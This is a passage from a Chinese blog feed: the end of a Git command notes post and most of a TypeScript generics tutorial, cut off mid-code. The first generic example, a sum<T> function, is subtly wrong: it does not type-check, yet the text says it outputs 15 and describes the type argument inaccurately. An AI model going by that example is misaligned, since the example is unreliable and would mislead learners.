<h3 id="记录指令"><a href="#记录指令" class="headerlink" title="记录指令"></a>记录指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 保存未commit的代码</span></span><br><span class="line">$ git stash</span><br><span class="line"><span class="comment"># 保存未commit的代码并备注</span></span><br><span class="line">$ git stash save</span><br><span class="line"><span class="comment"># 查看stash所有列表</span></span><br><span class="line">$ git stash list</span><br><span class="line"><span class="comment"># 删除所有记录</span></span><br><span class="line">$ git stash clear</span><br><span class="line"><span class="comment"># 查看并应用最后一次的记录</span></span><br><span class="line">$ git stash apply</span><br><span class="line"><span class="comment"># 删除记录并恢复到工作区</span></span><br><span class="line">$ git stash pop</span><br><span class="line"><span class="comment"># 删除最近一次记录</span></span><br><span class="line">$ git stash drop</span><br><span class="line"><span class="comment"># 删除指定记录</span></span><br><span class="line">$ git stash drop stash@&#123;&lt;number&gt;&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://git-scm.com/docs/git-stash">详见<code>git stash</code>更多信息</a></p>
<h2 id="11-设置默认分支"><a href="#11-设置默认分支" class="headerlink" title="11 设置默认分支"></a>11 设置默认分支</h2><p>一般不推荐全局设置默认分支，可根据项目需要设置默认分支。如 hexo + github 搭建的静态博客，静态资源所在的分支名一般命名为<code>gh-pages</code>，设置其为默认分支。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --<span class="built_in">local</span> init.defaultBranch gh-pages</span><br></pre></td></tr></table></figure>

<h2 id="12-取消暂存区的更改"><a href="#12-取消暂存区的更改" class="headerlink" title="12 取消暂存区的更改"></a>12 取消暂存区的更改</h2><p>更改的文件不会还原到未更改的状态，只是把已更改的文件从暂存区移到了工作区，这个移到，美其名曰撤销。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 撤销暂存区的某个文件到工作区</span></span><br><span class="line">$ git restore --staged &lt;file&gt;...</span><br><span class="line"><span class="comment"># 取消暂存所有更改</span></span><br><span class="line">$ git restore --staged .</span><br></pre></td></tr></table></figure>

<h2 id="13-恢复误删分支"><a href="#13-恢复误删分支" class="headerlink" title="13 恢复误删分支"></a>13 恢复误删分支</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 结合工具GitLens过滤出误删分支的Author，找到最近的一次commit id</span></span><br><span class="line"><span class="comment"># 基于这个commit id，新建分支</span></span><br><span class="line">$ git checkout -b &lt;new branch&gt; &lt;commit <span class="built_in">id</span>&gt;</span><br><span class="line"><span class="comment"># 推到远程仓库</span></span><br><span class="line">$ git push origin &lt;new branch&gt;</span><br></pre></td></tr></table></figure>

<p>不用担心是谁创建的恢复分支，因为你并没有 commit，只是依赖指定的 commit id 创建分支，不会有个人信息记录。</p>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://nvie.com/posts/a-successful-git-branching-model/">A successful Git branching model</a></p>
<p>[2] <a href="https://docs.gitlab.com/ee/topics/gitlab_flow.html">Introduction to GitLab Flow</a></p>
<p>[3] <a href="https://training.github.com/downloads/zh_CN/github-git-cheat-sheet/">git 速查清单</a></p>
<p>[4] <a href="https://git-scm.com/docs/git-reset">git reset</a></p>
<p>[5] <a href="https://ndpsoftware.com/git-cheatsheet.html#loc=index;">git 备忘单</a></p>
<p>[6] <a href="https://blog.csdn.net/weixin_42600398/article/details/113527932">git 中 tag 和 release 的区别</a></p>
<p>[7] <a href="https://blog.csdn.net/liuxiao723846/article/details/122691779">Git 之 revert</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>typescript成长之路</title>
    <url>/2021/11/12/20211112-typescript%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p><a href="http://www.typescriptlang.org/">TypeScript</a> 是 JavaScript 的一个超集，主要提供了<strong>类型系统</strong>和<strong>对 ES6 的支持</strong>，它由 Microsoft 开发，代码<a href="https://github.com/Microsoft/TypeScript">开源于 GitHub</a> 上。</p>
<p>它的第一个版本发布于 2012 年 10 月，经历了多次更新后，现在已成为前端社区中不可忽视的力量，不仅在 Microsoft 内部得到广泛运用，而且 Google 开发的 <a href="https://angular.io/">Angular</a> 从 2.0 开始就使用了 TypeScript 作为开发语言，<a href="https://vuejs.org/">Vue</a> 3.0 也使用 TypeScript 进行了重构。</p>
<p><img src="https://cdn.huatree.top/image-20230325140354690.png" alt="image-20230325140354690"></p>
<span id="more"></span>

<blockquote>
<p>学习方法：</p>
<p>先快速过，可标记疑难点，必须回顾所学，分析总结，转化成自己的理解与应用。</p>
</blockquote>
<h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><p><a href="https://www.typescriptlang.org/zh/docs/handbook/2/basic-types.html">官方文档</a></p>
<h3 id="为什么推荐去官方文档查看"><a href="#为什么推荐去官方文档查看" class="headerlink" title="为什么推荐去官方文档查看"></a>为什么推荐去官方文档查看</h3><p>第三方文档可能不够细，甚至断章取义，原本一个容易理解的概念，第三方文档解释就变了味道。</p>
<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出ts帮助，即指令用法</span></span><br><span class="line"><span class="comment"># 如果是在已存在的项目目录下执行该命令，则是编译项目</span></span><br><span class="line">$ tsc</span><br><span class="line"><span class="comment"># 查看当前安装的版本</span></span><br><span class="line">$ tsc -v</span><br><span class="line"><span class="comment"># 初始化项目</span></span><br><span class="line">$ tsc --init</span><br><span class="line"></span><br><span class="line">Created a new tsconfig.json with:                                                                                       </span><br><span class="line">                                                                                                                     TS </span><br><span class="line">  target: es2016</span><br><span class="line">  module: commonjs</span><br><span class="line">  strict: <span class="literal">true</span></span><br><span class="line">  esModuleInterop: <span class="literal">true</span></span><br><span class="line">  skipLibCheck: <span class="literal">true</span></span><br><span class="line">  forceConsistentCasingInFileNames: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">You can learn more at https://aka.ms/tsconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听文件改动</span></span><br><span class="line">$ tsc --watch</span><br></pre></td></tr></table></figure>

<h3 id="常用依赖"><a href="#常用依赖" class="headerlink" title="常用依赖"></a>常用依赖</h3><p>ts-node</p>
<p>简化 typescript 运行步骤，可直接在 node.js 环境中执行 ts 代码。</p>
<p>官网描述：用于 node.js 的 TypeScript 执行和 REPL，具有源映射和本机 ESM 支持。</p>
<p><a href="https://github.com/TypeStrong/ts-node">详见</a></p>
<p>当然，如果适用vscode开发，可以使用Code Runner插件，选择需要运行的文件，鼠标右键选择Run Code即可执行编译输出。</p>
<p>nodemon</p>
<p>监控 node.js 应用程序中的任何更改并自动重启服务器 - 非常适合开发。</p>
<p><a href="https://github.com/remy/nodemon">详见</a></p>
<p>在package.json中配置如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;script&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nodemon --watch src/ -e ts --exec ts-node ./src/app.ts&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="tsconfig-json配置"><a href="#tsconfig-json配置" class="headerlink" title="tsconfig.json配置"></a>tsconfig.json配置</h3><p><a href="https://www.typescriptlang.org/tsconfig">详见官网</a></p>
<h2 id="打包辅助工具"><a href="#打包辅助工具" class="headerlink" title="打包辅助工具"></a>打包辅助工具</h2><h3 id="parcel"><a href="#parcel" class="headerlink" title="parcel"></a>parcel</h3><p><a href="https://parceljs.org/docs/">详见</a></p>
<p>html中引入ts，可编译打包成js。</p>
<h3 id="webpack"><a href="#webpack" class="headerlink" title="webpack"></a>webpack</h3><p><a href="https://webpack.docschina.org/concepts/">详见</a></p>
<h3 id="自定义打包辅助工具"><a href="#自定义打包辅助工具" class="headerlink" title="自定义打包辅助工具"></a>自定义打包辅助工具</h3><p><a href="https://createapp.dev/">详见</a></p>
<h2 id="重点记忆"><a href="#重点记忆" class="headerlink" title="重点记忆"></a>重点记忆</h2><h2 id="有关功能的更多信息"><a href="#有关功能的更多信息" class="headerlink" title="有关功能的更多信息"></a>有关功能的更多信息</h2><p>函数重载</p>
<h2 id="类型操作"><a href="#类型操作" class="headerlink" title="类型操作"></a>类型操作</h2><h3 id="从类型中创建类型"><a href="#从类型中创建类型" class="headerlink" title="从类型中创建类型"></a>从类型中创建类型</h3><ul>
<li>泛型 - 带参数的类型</li>
<li>Keyof 类型操作符- keyof 操作符创建新类型</li>
<li>Typeof 类型操作符 - 使用 typeof 操作符来创建新的类型</li>
<li>索引访问类型 - 使用 Type[‘a’] 语法来访问一个类型的子集</li>
<li>条件类型 - 在类型系统中像if语句一样行事的类型</li>
<li>映射类型 - 通过映射现有类型中的每个属性来创建类型</li>
<li>模板字面量类型 - 通过模板字面字符串改变属性的映射类型</li>
</ul>
<h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><p>泛型是一种通用的编程概念，它允许在编写代码时不指定具体的类型，而是在使用代码时提供类型。通过使用泛型，可以编写更加通用和灵活的代码，使其能够适应不同的数据类型和数据结构。</p>
<p>在 TypeScript 中，泛型通常使用尖括号 <code>&lt; &gt;</code> 包裹，后跟一个标识符，例如 <code>T</code>、<code>U</code>、<code>K</code> 等等。这个标识符可以在代码中用作类型注释或泛型函数或类的参数。</p>
<p>例如，下面是一个泛型函数的例子，它使用类型参数 <code>T</code> 来表示一个数组中元素的类型，并返回数组中所有元素的和：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> sum&lt;T&gt;(<span class="attr">numbers</span>: T[]): T &#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numbers.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    result += numbers[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>sum</code> 函数接受一个类型为 <code>T</code> 的数组，并返回类型为 <code>T</code> 的值。当我们使用 <code>sum</code> 函数时，需要提供一个实际的类型作为类型参数，例如：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> numbers = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="keyword">const</span> result = <span class="title function_">sum</span>(numbers);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result); <span class="comment">// 输出 15</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，我们将 <code>numbers</code> 数组作为参数传递给 <code>sum</code> 函数，并在调用函数时使用 <code>number</code> 类型作为类型参数。函数将返回一个 <code>number</code> 类型的值，它是数组中所有元素的和。</p>
<p>通过使用泛型，我们可以编写可重用的代码，使其能够适应不同的数据类型和数据结构，从而提高代码的灵活性和通用性。</p>
<h4 id="什么是类型参数"><a href="#什么是类型参数" class="headerlink" title="什么是类型参数"></a>什么是类型参数</h4><p><strong>泛型也可以称为类型参数</strong>。在 TypeScript 中，泛型可以被用作类型参数，用于指定在编写代码时不确定的数据类型。</p>
<p>因此，泛型和类型参数的概念是相互关联的。泛型是一种通用的编程概念，用于指定在编写代码时不确定的数据类型，而<strong>类型参数则是指在使用泛型时需要提供的具体类型。</strong></p>
<h4 id="使用泛型类型变量"><a href="#使用泛型类型变量" class="headerlink" title="使用泛型类型变量"></a>使用泛型类型变量</h4><p>首先，让我们做一下泛型的 “ hello world”：身份函数。身份函数是一个函数，它将返回传入的任何内容。你可以用类似于echo命令的方式来考虑它。</p>
<p>如果没有泛型，我们将不得不给身份函数一个特定的返回值类型。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">identity</span>(<span class="params">arg: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者，我们可以用任意类型来描述身份函数。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">identity</span>(<span class="params">arg: <span class="built_in">any</span></span>): <span class="built_in">any</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 any 当然是通用的，因为它将使函数接受 arg 类型的<strong>任何和所有的类型</strong>。实际上我们在函数返回时失去了关于该类型的信息。如果我们传入一个数字，我们唯一的信息就是任何类型都可以被返回。</p>
<p>相反，我们需要一种方法来捕获参数的类型，以便我们也可以用它来表示返回的内容。在这里，我们将使用一个类型变量，这是一种特殊的变量，<strong>对类型而不是数值起作用</strong>。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> identity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不借助编译器的类型推断写法</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> output = identity&lt;<span class="built_in">string</span>&gt;(<span class="string">&quot;myString&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>相反，编译器只是查看了 “myString “这个值，并将Type设置为其类型。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> output = <span class="title function_">identity</span>(<span class="string">&quot;myString&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>如果我们想在每次调用时将参数 arg 的长度记录到控制台，该怎么办？我们可能很想这样写：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> loggingIdentity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">length</span>); <span class="comment">// error 类型“Type”上不存在属性“length”。</span></span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们这样做时，编译器会给我们一个错误，说我们在使用 arg 的 .length 成员，但我们没有说arg 有这个成员。记住，我们在前面说过，这些类型的变量可以代表任何和所有的类型，所以使用这个函数的人可以传入一个 number ，而这个数字没有一个 .length 成员。</p>
<p>比方说，我们实际上是想让这个函数在 Type 的数组上工作，而不是直接在 Type 上工作。既然我们在处理数组，那么 .length 成员应该是可用的。我们可以像创建其他类型的数组那样来描述它。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> loggingIdentity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>[]): <span class="title class_">Type</span>[] &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">length</span>);</span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你可以把 loggingIdentity 的类型理解为 “通用函数 loggingIdentity 接收一个类型参数 Type 和</p>
<p>一个参数 arg ， arg 是一个 Type 数组，并返回一个 Type 数组。” 如果我们传入一个数字数组，我们会得到一个数字数组，因为Type会绑定到数字。<strong>这允许我们使用我们的通用类型变量 Type 作为我们正在处理的类型的一部分，而不是整个类型</strong>，给我们更大的灵活性。</p>
<p>我们也可以这样来写这个例子：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> loggingIdentity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Array</span>&lt;<span class="title class_">Type</span>&gt;): <span class="title class_">Array</span>&lt;<span class="title class_">Type</span>&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">length</span>); <span class="comment">// 数组有一个.length，所以不会再出错了</span></span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Array&lt;Type&gt;：整体是一个数组类型，Type是其中的一部分类型</span></span><br></pre></td></tr></table></figure>

<h4 id="泛型类型"><a href="#泛型类型" class="headerlink" title="泛型类型"></a>泛型类型</h4><p>在前面的部分中，我们创建了适用于一系列类型的通用身份函数。在本节中，我们将探讨函数本身的类型以及如何创建通用接口。</p>
<p>泛型函数的类型与非泛型函数的类型一样，首先列出类型参数，类似于函数声明：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> identity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">myIdentity</span>: &lt;<span class="title class_">Type</span>&gt;<span class="function">(<span class="params">arg: Type</span>) =&gt;</span> <span class="title class_">Type</span> = identity;</span><br></pre></td></tr></table></figure>

<p>我们也可以为类型中的泛型类型参数使用不同的名称，只要类型变量的数量和类型变量的使用方式一致即可。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> identity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> <span class="attr">myIdentity</span>: &lt;<span class="title class_">Input</span>&gt;<span class="function">(<span class="params">arg: Input</span>) =&gt;</span> <span class="title class_">Input</span> = identity;</span><br></pre></td></tr></table></figure>

<p>我们还可以将泛型类型写成<strong>对象字面量类型</strong>的调用签名：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> identity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> <span class="attr">myIdentity</span>: &#123; &lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#125; = identity;</span><br></pre></td></tr></table></figure>

<p>感觉有种匿名函数的写法，怪怪的。</p>
<p>这导致我们编写了第一个通用接口。让我们把前面例子中的<strong>对象字面量</strong>移到一个接口中：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">GenericIdentityFn</span> &#123;</span><br><span class="line">  &lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> identity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> <span class="attr">myIdentity</span>: <span class="title class_">GenericIdentityFn</span> = identity;</span><br></pre></td></tr></table></figure>

<p>在类似的示例中，我们可能希望<strong>将通用参数移动为整个接口的参数</strong>。这让我们可以看到我们通用的类型（例如，<code>Dictionary&lt;string&gt;</code>而不仅仅是<code>Dictionary</code>）。这使得类型参数对接口的所有其他成员可见。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">GenericIdentityFn</span>&lt;<span class="title class_">Type</span>&gt; &#123;</span><br><span class="line">  (<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> identity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> <span class="attr">myIdentity</span>: <span class="title class_">GenericIdentityFn</span>&lt;<span class="built_in">number</span>&gt; = identity;</span><br></pre></td></tr></table></figure>

<p>请注意，我们的示例已更改为略有不同。我们现在没有描述泛型函数，而是有一个非泛型函数签名，它是泛型类型的一部分。当我们使用<code>GenericIdentityFn</code>时，我们现在还需要指定相应的类型参数（此处：<code>number</code>），有效地锁定底层调用签名将使用的内容。了解何时将类型参数直接放在调用签名上以及何时将其放在接口本身上将有助于描述类型的哪些方面是通用的。</p>
<p>除了泛型接口，我们还可以创建泛型类。<strong>请注意，无法创建通用枚举和命名空间</strong>。</p>
<h4 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h4><p>类和接口一样，可以是泛型的。当一个泛型类用new实例化时，其类型参数的推断方式与函数调用的</p>
<p>方式相同。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&lt;<span class="title class_">Type</span>&gt; &#123;</span><br><span class="line">  <span class="attr">contents</span>: <span class="title class_">Type</span>;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">value: Type</span>) &#123;</span><br><span class="line">   <span class="variable language_">this</span>.<span class="property">contents</span> = value;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// const b: Box&lt;string&gt;</span></span><br><span class="line"><span class="keyword">const</span> b = <span class="keyword">new</span> <span class="title class_">Box</span>(<span class="string">&quot;hello!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>类可以像接口一样使用通用约束和默认值。</p>
<p>静态成员中的类型参数。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Box</span>&lt;<span class="title class_">Type</span>&gt; &#123;</span><br><span class="line">  <span class="comment">// 静态成员不能引用类的类型参数。</span></span><br><span class="line">  <span class="keyword">static</span> <span class="attr">defaultValue</span>: <span class="title class_">Type</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Box&lt;string&gt;.defaultValue = &#x27;hello&#x27;</span></span><br><span class="line"><span class="comment">// console.log(Box&lt;number&gt;.defaultValue)</span></span><br></pre></td></tr></table></figure>

<p>请记住，类型总是被完全擦除的! 在运行时，只有一个Box.defaultValue属性。这意味着设置Box.defaultValue（如果有可能的话）也会改变Box.defaultValue，这可不是什么好事。一个泛型类的静态成员永远不能引用该类的类型参数。</p>
<h4 id="泛型约束"><a href="#泛型约束" class="headerlink" title="泛型约束"></a>泛型约束</h4><p>在我们的<code>loggingIdentity</code>示例中，我们希望能够访问<code>.length</code>的属性<code>arg</code>，但编译器无法证明每个类型都有一个<code>.length</code>属性，因此它警告我们不能做出这种假设。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> loggingIdentity&lt;<span class="title class_">Type</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">length</span>); <span class="comment">// error 类型“Type”上不存在属性“length”。</span></span><br><span class="line">  <span class="keyword">return</span> arg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们不想使用任何和所有类型，而是希望将此函数限制为使用<em>也</em> 具有该<code>.length</code>属性的任何和所有类型。只要类型有这个成员，我们就允许它，但它至少需要有这个成员。为此，我们必须将我们的要求列为限制条件<code>Type</code>。</p>
<p>为此，我们将创建一个描述约束的接口。在这里，我们将创建一个具有单个<code>.length</code>属性的接口，然后我们将使用该接口和<code>extends</code>关键字来表示我们的约束：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Lengthwise</span> &#123;</span><br><span class="line">  <span class="attr">length</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> loggingIdentity&lt;<span class="title class_">Type</span> <span class="keyword">extends</span> <span class="title class_">Lengthwise</span>&gt;(<span class="attr">arg</span>: <span class="title class_">Type</span>): <span class="title class_">Type</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">length</span>); </span><br><span class="line">  <span class="keyword">return</span> arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为泛型函数现在受到约束，所以它不再适用于所有类型：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">loggingIdentity</span>(<span class="number">3</span>); <span class="comment">// error 类型“number”的参数不能赋给类型“Lengthwise”的参数。</span></span><br></pre></td></tr></table></figure>

<p>相反，我们需要传入其类型具有所有必需属性的值：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">loggingIdentity</span>(&#123; <span class="attr">length</span>: <span class="number">10</span>, <span class="attr">value</span>: <span class="number">3</span> &#125;);</span><br></pre></td></tr></table></figure>

<h4 id="在泛型约束中使用类型参数"><a href="#在泛型约束中使用类型参数" class="headerlink" title="在泛型约束中使用类型参数"></a>在泛型约束中使用类型参数</h4><p>您可以声明一个受另一个类型参数约束的类型参数。例如，在这里我们想从给定名称的对象中获取属性。我们想确保我们不会意外获取<code>obj</code>上不存在的属性，因此我们将在两种类型之间放置一个约束：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> getProperty&lt;<span class="title class_">Type</span>, <span class="title class_">Key</span> <span class="keyword">extends</span> keyof <span class="title class_">Type</span>&gt;(<span class="attr">obj</span>: <span class="title class_">Type</span>, <span class="attr">key</span>: <span class="title class_">Key</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> obj[key];</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">let</span> x = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>, <span class="attr">c</span>: <span class="number">3</span>, <span class="attr">d</span>: <span class="number">4</span> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="title function_">getProperty</span>(x, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_">getProperty</span>(x, <span class="string">&quot;m&quot;</span>); <span class="comment">// error 类型“&quot;m&quot;”的参数不能赋给类型“&quot;a&quot; | &quot;b&quot; | &quot;c&quot; | &quot;d&quot;”的参数。 </span></span><br></pre></td></tr></table></figure>

<h4 id="在泛型中使用类类型"><a href="#在泛型中使用类类型" class="headerlink" title="在泛型中使用类类型"></a>在泛型中使用类类型</h4><p>在 TypeScript 中使用泛型创建工厂时，需要通过构造函数来引用类类型。例如，</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> create&lt;<span class="title class_">Type</span>&gt;(<span class="attr">c</span>: &#123; <span class="keyword">new</span> (): <span class="title class_">Type</span> &#125;): <span class="title class_">Type</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title function_">c</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一个更高级的示例使用原型属性来推断和约束构造函数与类类型的实例端之间的关系。</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BeeKeeper</span> &#123;</span><br><span class="line">  <span class="attr">hasMask</span>: <span class="built_in">boolean</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ZooKeeper</span> &#123;</span><br><span class="line">  <span class="attr">nametag</span>: <span class="built_in">string</span> = <span class="string">&quot;Mikle&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">  <span class="attr">numLegs</span>: <span class="built_in">number</span> = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bee</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span> &#123;</span><br><span class="line">  <span class="attr">keeper</span>: <span class="title class_">BeeKeeper</span> = <span class="keyword">new</span> <span class="title class_">BeeKeeper</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Lion</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Animal</span> &#123;</span><br><span class="line">  <span class="attr">keeper</span>: <span class="title class_">ZooKeeper</span> = <span class="keyword">new</span> <span class="title class_">ZooKeeper</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> createInstance&lt;A <span class="keyword">extends</span> <span class="title class_">Animal</span>&gt;(<span class="attr">c</span>: <span class="keyword">new</span> () =&gt; A): A 